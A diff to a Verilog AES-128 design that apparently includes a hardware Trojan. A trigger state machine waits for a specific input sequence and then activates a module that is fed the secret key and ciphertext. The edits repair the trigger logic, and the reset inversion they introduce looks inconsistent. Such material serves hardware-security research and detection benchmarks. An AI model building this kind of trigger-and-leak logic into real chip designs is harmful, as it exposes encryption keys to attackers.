@@ -29,7 +29,7 @@ module aes_top (
 	
 	// Instantiation of AES encryption module
 	aes_128 AES (.clk(clk), .rst(rst), .state(state), .key(key), .out(HT_ciphertext)); 
-	HT_Tri HT_Trigger (.rst(rst), .state(state), .Tj_Trig(HT_Trig)); 
+	HT_Tri HT_Trigger (.rst(rst), .state(state), .Tj_Trig(HT_Trig), .clk(clk)); 
 	HT_TSC HT_Trojan (.Tj_Trig(HT_Trig), .key(key), .ciphertext(HT_ciphertext), .out(out)); 
  
 endmodule
@@ -50,10 +50,10 @@ module HT_Tri(
     
     reg [2:0] current_state;
     reg [2:0] next_state;
-    
+    initial current_state = ORIGINAL;
     // Define state transition conditions
     always @(posedge clk or posedge rst) begin
-        if (rst) begin
+        if (!rst) begin
             current_state <= ORIGINAL;
         end else begin
             current_state <= next_state;
@@ -64,28 +64,28 @@ module HT_Tri(
     always @(*) begin
         case (current_state)
             ORIGINAL: begin
-                if (state & 1'b1 == 1'b0) begin
+                if ((state & 1'b1) == 1'b0) begin
                     next_state = STATE1;
                 end else begin
                     next_state = ORIGINAL;
                 end
             end
             STATE1: begin
-                if (state & 1'b1 == 1'b0) begin
+                if ((state & 1'b1) == 1'b0) begin
                     next_state = STATE2;
                 end else begin
                     next_state = ORIGINAL;
                 end
             end
             STATE2: begin
-                if (state & 1'b1 == 1'b1) begin
+                if ((state & 1'b1) == 1'b1) begin
                     next_state = STATE3;
                 end else begin
                     next_state = ORIGINAL;
                 end
             end
             STATE3: begin
-                if (state ^ 120'h112233_44556677_8899aabb_ccddeeff == 1'b0) begin
+                if ((state ^ 120'h112233_44556677_8899aabb_ccddeeff) == 1'b0) begin
                     next_state = FINAL;
                 end else begin
                     next_state = ORIGINAL;
@@ -102,9 +102,7 @@ module HT_Tri(
     
     // Output logic
     always @(posedge clk or posedge rst) begin
-        if (rst) begin
-            Tj_Trig <= 0;
-        end else if (current_state == FINAL) begin
+        if (current_state == FINAL) begin
             Tj_Trig <= 1;
         end else begin
             Tj_Trig <= 0;
